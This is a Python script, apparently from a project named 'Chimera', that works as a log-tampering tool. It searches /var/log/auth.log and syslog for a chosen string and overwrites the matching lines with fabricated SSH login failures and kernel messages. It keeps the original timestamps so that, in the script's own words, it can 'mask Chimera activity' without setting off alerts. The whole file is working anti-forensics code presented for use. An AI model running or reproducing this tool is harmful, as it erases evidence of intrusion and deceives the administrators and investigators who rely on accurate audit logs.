#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import time
import random

class LogGarbler:
    """
    Agent 409 (Hardened): Forensic Noise Generator.
    Overwrites specific log entries with 'Red Herring' data to 
    mask Chimera activity without triggering log-volume alerts.
    """
    def __init__(self):
        self.target_logs = ["/var/log/auth.log", "/var/log/syslog"]
        self.false_flags = [
            "sshd[{pid}]: Invalid user {user} from {ip} port {port}",
            "sshd[{pid}]: Connection closed by authenticating user {user} {ip} port {port} [preauth]",
            "kernel: [ {uptime}.{ms}] pcieport 0000:00:1c.0: AER: Corrected error received"
        ]
        self.noise_users = ["root", "admin", "user", "test", "oracle", "postgres"]

    def _generate_noise_entry(self):
        """Creates a realistic, boring log entry."""
        pid = random.randint(1000, 30000)
        user = random.choice(self.noise_users)
        ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        port = random.randint(30000, 65000)
        uptime = random.randint(1000, 99999)
        ms = random.randint(100000, 999999)
        
        template = random.choice(self.false_flags)
        return template.format(pid=pid, user=user, ip=ip, port=port, uptime=uptime, ms=ms)

    def garble(self, target_string):
        """Finds our 'string' in logs and replaces it with noise."""
        print(f"[*] Searching for Chimera traces to garble...")
        
        for log_path in self.target_logs:
            if not os.path.exists(log_path): continue
            
            try:
                with open(log_path, 'r') as f:
                    lines = f.readlines()

                new_lines = []
                count = 0
                for line in lines:
                    if target_string in line:
                        # Replace our trace with a fake login failure
                        timestamp = line.split(' ')[0:3] # Preserve original timestamp
                        noise = self._generate_noise_entry()
                        new_lines.append(f"{' '.join(timestamp)} {noise}\n")
                        count += 1
                    else:
                        new_lines.append(line)

                if count > 0:
                    with open(log_path, 'w') as f:
                        f.writelines(new_lines)
                    print(f"[\033[92mSUCCESS\033[0m] Garbled {count} entries in {log_path}")
            except Exception as e:
                print(f"[!] Permission Denied or Error on {log_path}: {e}")

    def execute(self, trace_to_hide):
        print("--- [AGENT 409: LOG GARBLER ACTIVE] ---")
        self.garble(trace_to_hide)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py <string_to_mask>")
        sys.exit(1)
    LogGarbler().execute(sys.argv[1])
